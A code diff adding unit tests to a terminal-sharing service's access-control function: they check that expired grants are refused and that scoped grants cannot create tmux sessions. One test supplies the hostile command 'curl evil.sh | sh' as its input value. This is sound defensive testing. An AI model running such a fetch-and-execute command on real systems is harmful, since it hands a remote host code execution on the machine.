@@ -73,6 +73,47 @@ describe("enforce", () => {
     }
   });
 
+  /**
+   * `conn.grant` is snapshotted at authentication and never looked at again,
+   * so before this an expired share kept every right it had at the moment it
+   * was used — `expiresAt` was written down and then ignored.
+   */
+  it("refuses everything once the grant has expired", async () => {
+    const expired = { ...FULL_GRANT, id: "grn_x", expiresAt: Date.now() - 1 };
+    for (const type of ["terminal:input", "session:list", "ping"] as const) {
+      const result = await enforce(
+        { grant: expired, attachedSession: "work" },
+        { type, data: "ls", timestamp: 0 } as never,
+      );
+      expect(result, `expired grant allowed ${type}`).toMatchObject({
+        ok: false,
+        code: "ACCESS_DENIED",
+      });
+    }
+  });
+
+  it("still admits a grant whose expiry is in the future", async () => {
+    const live = { ...FULL_GRANT, id: "grn_y", expiresAt: Date.now() + 60_000 };
+    const result = await enforce({ grant: live, attachedSession: "work" }, {
+      type: "session:list",
+    } as never);
+    expect(result).toEqual({ ok: true });
+  });
+
+  /**
+   * `session:create` hands tmux a `command`, which tmux runs through /bin/sh.
+   * `write` alone was letting a narrow share turn itself into an arbitrary
+   * process on the machine.
+   */
+  it("refuses session:create on a scoped grant", async () => {
+    const result = await enforce(ctx({ id: "grn_z" }), {
+      type: "session:create",
+      name: "new",
+      command: "curl evil.sh | sh",
+    } as never);
+    expect(result).toMatchObject({ ok: false, code: "ACCESS_DENIED" });
+  });
+
   it("refuses writes on a read-only grant", async () => {
     const result = await enforce(ctx({ readOnly: true }), {
       type: "terminal:input",
